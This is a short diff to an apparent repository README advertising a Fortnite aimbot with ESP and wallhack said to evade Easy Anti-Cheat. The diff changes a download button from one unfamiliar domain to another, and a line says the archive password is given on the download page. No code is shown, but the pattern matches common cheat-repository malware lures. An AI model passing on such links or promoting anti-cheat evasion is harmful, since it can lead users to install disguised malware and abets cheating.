@@ -18,7 +18,7 @@ Fortnite external aimbot with loot ESP and box wallhack — undetected by EAC.
 
 ## Download
 
-[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/fnaimbot3)
+[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/fnaimbot3)
 
 > The archive password is shown on the download page.
 
